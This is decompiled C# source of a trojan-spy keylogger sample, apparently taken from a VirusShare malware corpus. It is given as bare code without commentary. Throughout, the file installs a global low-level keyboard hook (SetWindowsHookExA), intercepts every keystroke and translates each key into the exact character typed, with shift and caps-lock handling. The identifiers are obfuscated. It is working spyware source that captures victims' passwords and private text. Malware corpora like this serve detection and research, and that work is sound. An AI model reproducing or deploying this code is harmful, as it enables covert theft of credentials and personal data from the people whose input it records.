// Decompiled with JetBrains decompiler
// Type: JFsnADcn
// Assembly: server, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: CD199AF6-714A-4002-ACEF-1B22892CF632
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan-Spy.MSIL.KeyLogger.aww-f9ea09314b7c8778e89abe01467627e7dcd8c5881ef052db5e22ba9ef11bf552.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class JFsnADcn
{
  private static int cIQQiBaY;
  private static JFsnADcn.YyrofcTh TtviokNY;

  [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int lfFEEUyK(
    int grhVkOzz,
    JFsnADcn.YyrofcTh kssvUfPY,
    int DZWxwfpI,
    int NjfAiTYU);

  [DllImport("user32", EntryPoint = "CallNextHookEx", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int LSycFgPc(
    int grhVkOzz,
    int DbDdHZdN,
    int BAWOnoIU,
    ref JFsnADcn.BwOUEeKk SzrQrxnj);

  [DllImport("user32", EntryPoint = "UnhookWindowsHookEx", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int NhzkzfYL(int grhVkOzz);

  public static event JFsnADcn.gTTNCfFJEventHandler gTTNCfFJ;

  public static event JFsnADcn.PuOHJbyQEventHandler PuOHJbyQ;

  public void PcxsAocU()
  {
    JFsnADcn.TtviokNY = new JFsnADcn.YyrofcTh(this.RHikwJCj);
    JFsnADcn.cIQQiBaY = JFsnADcn.lfFEEUyK(13, JFsnADcn.TtviokNY, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
  }

  private int RHikwJCj(int hvntnbVg, int BAWOnoIU, ref JFsnADcn.BwOUEeKk SzrQrxnj)
  {
    if (hvntnbVg == 0)
    {
      switch (BAWOnoIU)
      {
        case 256:
        case 260:
          JFsnADcn.gTTNCfFJEventHandler gTtnCfFjEvent = JFsnADcn.gTTNCfFJEvent;
          if (gTtnCfFjEvent != null)
          {
            gTtnCfFjEvent(this.dVavzkBT((Keys) SzrQrxnj.hvntnbVg));
            break;
          }
          break;
        case 257:
        case 261:
          JFsnADcn.PuOHJbyQEventHandler puOhJbyQevent = JFsnADcn.PuOHJbyQEvent;
          if (puOhJbyQevent != null)
          {
            puOhJbyQevent(this.dVavzkBT((Keys) SzrQrxnj.hvntnbVg));
            break;
          }
          break;
      }
    }
    return JFsnADcn.LSycFgPc(JFsnADcn.cIQQiBaY, hvntnbVg, BAWOnoIU, ref SzrQrxnj);
  }

  public void WiZeGKfV()
  {
    JFsnADcn.NhzkzfYL(JFsnADcn.cIQQiBaY);
    // ISSUE: explicit finalizer call
    this.Finalize();
  }

  private string dVavzkBT(Keys nKcdYRnOJtp)
  {
    Keys keys = nKcdYRnOJtp;
    if (keys >= Keys.A && keys <= Keys.Z)
      return Control.IsKeyLocked(Keys.Capital) | (Control.ModifierKeys & Keys.Shift) != Keys.None ? nKcdYRnOJtp.ToString() : nKcdYRnOJtp.ToString().ToLower();
    if (keys >= Keys.D0 && keys <= Keys.D9)
    {
      if ((Control.ModifierKeys & Keys.Shift) == Keys.None)
        return nKcdYRnOJtp.ToString().Replace("D", (string) null);
      string Left = nKcdYRnOJtp.ToString();
      if (Operators.CompareString(Left, "D1", false) == 0)
        return "!";
      if (Operators.CompareString(Left, "D2", false) == 0)
        return "@";
      if (Operators.CompareString(Left, "D3", false) == 0)
        return "#";
      if (Operators.CompareString(Left, "D4", false) == 0)
        return "$";
      if (Operators.CompareString(Left, "D5", false) == 0)
        return "%";
      if (Operators.CompareString(Left, "D6", false) == 0)
        return "^";
      if (Operators.CompareString(Left, "D7", false) == 0)
        return "&";
      if (Operators.CompareString(Left, "D8", false) == 0)
        return "*";
      if (Operators.CompareString(Left, "D9", false) == 0)
        return "(";
      if (Operators.CompareString(Left, "D0", false) == 0)
        return ")";
    }
    else
    {
      if (keys >= Keys.NumPad0 && keys <= Keys.NumPad9)
        return nKcdYRnOJtp.ToString().Replace("NumPad", (string) null);
      if (keys >= Keys.Multiply && keys <= Keys.Divide)
      {
        string Left = nKcdYRnOJtp.ToString();
        if (Operators.CompareString(Left, "Divide", false) == 0)
          return "/";
        if (Operators.CompareString(Left, "Multiply", false) == 0)
          return "*";
        if (Operators.CompareString(Left, "Subtract", false) == 0)
          return "-";
        if (Operators.CompareString(Left, "Add", false) == 0)
          return "+";
        if (Operators.CompareString(Left, "Decimal", false) == 0)
          return ".";
      }
      else
      {
        if (keys == Keys.Space)
          return " ";
        if (keys >= Keys.OemSemicolon && keys <= Keys.OemQuotes)
        {
          if ((Control.ModifierKeys & Keys.Shift) != Keys.None)
          {
            string Left = nKcdYRnOJtp.ToString();
            if (Operators.CompareString(Left, "OemMinus", false) == 0)
              return "_";
            if (Operators.CompareString(Left, "Oemplus", false) == 0)
              return "+";
            if (Operators.CompareString(Left, "OemOpenBrackets", false) == 0)
              return "{";
            if (Operators.CompareString(Left, "Oem6", false) == 0)
              return "}";
            if (Operators.CompareString(Left, "Oem5", false) == 0)
              return "|";
            if (Operators.CompareString(Left, "Oem1", false) == 0)
              return ":";
            if (Operators.CompareString(Left, "Oem7", false) == 0)
              return "\"";
            if (Operators.CompareString(Left, "Oemcomma", false) == 0)
              return "<";
            if (Operators.CompareString(Left, "OemPeriod", false) == 0)
              return ">";
            if (Operators.CompareString(Left, "OemQuestion", false) == 0)
              return "?";
            if (Operators.CompareString(Left, "Oemtilde", false) == 0)
              return "~";
          }
          else
          {
            string Left = nKcdYRnOJtp.ToString();
            if (Operators.CompareString(Left, "OemMinus", false) == 0)
              return "-";
            if (Operators.CompareString(Left, "Oemplus", false) == 0)
              return "=";
            if (Operators.CompareString(Left, "OemOpenBrackets", false) == 0)
              return "[";
            if (Operators.CompareString(Left, "Oem6", false) == 0)
              return "]";
            if (Operators.CompareString(Left, "Oem5", false) == 0)
              return "\\";
            if (Operators.CompareString(Left, "Oem1", false) == 0)
              return ";";
            if (Operators.CompareString(Left, "Oem7", false) == 0)
              return "'";
            if (Operators.CompareString(Left, "Oemcomma", false) == 0)
              return ",";
            if (Operators.CompareString(Left, "OemPeriod", false) == 0)
              return ".";
            if (Operators.CompareString(Left, "OemQuestion", false) == 0)
              return "/";
            if (Operators.CompareString(Left, "Oemtilde", false) == 0)
              return "`";
          }
        }
        else
          return keys == Keys.Return ? Environment.NewLine : "<" + nKcdYRnOJtp.ToString() + ">";
      }
    }
    return (string) null;
  }

  private delegate int YyrofcTh(int DbDdHZdN, int BAWOnoIU, ref JFsnADcn.BwOUEeKk SzrQrxnj);

  public delegate void gTTNCfFJEventHandler(string cIQQiBaY);

  public delegate void PuOHJbyQEventHandler(string cIQQiBaY);

  private struct BwOUEeKk
  {
    public int hvntnbVg;
    public int pQlWcgtI;
    public int zEAvYxru;
    public int ooJgorLS;
    public int WGNWtUkh;
  }
}
